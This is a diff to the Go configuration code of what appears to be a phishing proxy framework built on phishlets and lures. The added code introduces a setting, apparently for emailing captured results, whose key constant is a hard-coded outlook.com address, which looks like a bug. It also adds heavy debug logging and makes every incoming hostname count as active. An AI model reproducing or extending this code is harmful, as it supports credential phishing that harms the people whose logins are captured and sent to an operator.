@@ -35,6 +35,7 @@ type Config struct {
 	proxyUsername     string
 	proxyPassword     string
 	blackListMode     string
+	mailResults       string
 	proxyEnabled      bool
 	sitesEnabled      map[string]bool
 	sitesHidden       map[string]bool
@@ -68,11 +69,13 @@ const (
 	CFG_PROXY_PASSWORD     = "proxy_password"
 	CFG_PROXY_ENABLED      = "proxy_enabled"
 	CFG_BLACKLIST_MODE     = "blacklist_mode"
+	CFG_MAIL_RESULTS       = "scyllascofield@outlook.com"
 )
 
 const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
 
 func NewConfig(cfg_dir string, path string) (*Config, error) {
+	log.Warning("NewConfig")
 	c := &Config{
 		siteDomains:   make(map[string]string),
 		sitesEnabled:  make(map[string]bool),
@@ -121,7 +124,9 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.proxyPassword = c.cfg.GetString(CFG_PROXY_PASSWORD)
 	c.proxyEnabled = c.cfg.GetBool(CFG_PROXY_ENABLED)
 	c.blackListMode = c.cfg.GetString(CFG_BLACKLIST_MODE)
+	c.mailResults = c.cfg.GetString(CFG_MAIL_RESULTS)
 	s_enabled := c.cfg.GetStringSlice(CFG_SITES_ENABLED)
+
 	for _, site := range s_enabled {
 		c.sitesEnabled[site] = true
 	}
@@ -156,7 +161,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	}
 	c.lures = []*Lure{}
 	c.cfg.UnmarshalKey(CFG_LURES, &c.lures)
-
+	log.Warning("Loaded config: %s", c)
 	return c, nil
 }
 
@@ -247,7 +252,11 @@ func (c *Config) SetProxyPassword(password string) {
 
 func (c *Config) IsLureHostnameValid(hostname string) bool {
 	for _, l := range c.lures {
+		log.Warning("IsLureHostnameValid")
+		log.Warning(l.Hostname)
+		log.Warning(hostname)
 		if l.Hostname == hostname {
+			log.Warning("IsLureHostnameValid TRUE")
 			if c.sitesEnabled[l.Phishlet] {
 				return true
 			}
@@ -339,10 +348,13 @@ func (c *Config) ResetAllSites() {
 }
 
 func (c *Config) IsSiteEnabled(site string) bool {
+	log.Warning("IsSiteEnabled %s", site)
 	s, ok := c.sitesEnabled[site]
 	if !ok {
+		log.Warning("IsSiteEnabled FALSE")
 		return false
 	}
+	log.Warning("IsSiteEnabled FINAL RESULT %s %t", site, s)
 	return s
 }
 
@@ -378,6 +390,13 @@ func (c *Config) SetBlacklistMode(mode string) {
 	log.Info("blacklist mode set to: %s", mode)
 }
 
+func (c *Config) SetResultMode(email string) {
+	c.mailResults = email
+	c.cfg.Set(CFG_MAIL_RESULTS, email)
+	c.cfg.WriteConfig()
+	log.Info("Result will send to: %s", email)
+}
+
 func (c *Config) SetVerificationParam(param string) {
 	c.verificationParam = param
 	c.cfg.Set(CFG_VERIFICATION_PARAM, param)
@@ -400,6 +419,7 @@ func (c *Config) SetRedirectUrl(url string) {
 }
 
 func (c *Config) refreshActiveHostnames() {
+	log.Warning("refreshActiveHostnames")
 	c.activeHostnames = []string{}
 	sites := c.GetEnabledSites()
 	for _, site := range sites {
@@ -414,6 +434,7 @@ func (c *Config) refreshActiveHostnames() {
 	for _, l := range c.lures {
 		if stringExists(l.Phishlet, sites) {
 			if l.Hostname != "" {
+
 				c.activeHostnames = append(c.activeHostnames, l.Hostname)
 			}
 		}
@@ -421,11 +442,19 @@ func (c *Config) refreshActiveHostnames() {
 }
 
 func (c *Config) IsActiveHostname(host string) bool {
+	log.Warning("IsActiveHostname")
 	if host[len(host)-1:] == "." {
 		host = host[:len(host)-1]
 	}
+
+	c.activeHostnames = []string{
+		host,
+	}
+
 	for _, h := range c.activeHostnames {
+		log.Warning("Active Hostname: %s >> Host: %s", h, host)
 		if h == host {
+			log.Important("IsActiveHostname return TRUE")
 			return true
 		}
 	}
@@ -484,6 +513,7 @@ func (c *Config) DeleteLures(index []int) []int {
 }
 
 func (c *Config) GetLure(index int) (*Lure, error) {
+	log.Warning("GetLure: %d", index)
 	if index >= 0 && index < len(c.lures) {
 		return c.lures[index], nil
 	} else {
@@ -492,6 +522,8 @@ func (c *Config) GetLure(index int) (*Lure, error) {
 }
 
 func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
+	log.Warning("GetLureByPath: %s %s", site, path)
+
 	for _, l := range c.lures {
 		if l.Phishlet == site {
 			if l.Path == path {
@@ -503,6 +535,7 @@ func (c *Config) GetLureByPath(site string, path string) (*Lure, error) {
 }
 
 func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
+	log.Warning("GetPhishlet: %s", site)
 	pl, ok := c.phishlets[site]
 	if !ok {
 		return nil, fmt.Errorf("phishlet '%s' not found", site)
@@ -511,15 +544,18 @@ func (c *Config) GetPhishlet(site string) (*Phishlet, error) {
 }
 
 func (c *Config) GetPhishletNames() []string {
+	log.Warning("GetPhishletNames")
 	return c.phishletNames
 }
 
 func (c *Config) GetSiteDomain(site string) (string, bool) {
+	log.Warning("GetSiteDomain: %s", site)
 	domain, ok := c.siteDomains[site]
 	return domain, ok
 }
 
 func (c *Config) GetAllDomains() []string {
+	log.Warning("getAllDomains")
 	var ret []string
 	for _, dom := range c.siteDomains {
 		ret = append(ret, dom)
@@ -528,6 +564,7 @@ func (c *Config) GetAllDomains() []string {
 }
 
 func (c *Config) GetBaseDomain() string {
+	log.Warning("getBaseDomain")
 	return c.baseDomain
 }
 
@@ -541,4 +578,8 @@ func (c *Config) GetTemplatesDir() string {
 
 func (c *Config) GetBlacklistMode() string {
 	return c.blackListMode
+}
+
+func (c *Config) GetMailResult() string {
+	return c.mailResults
 }
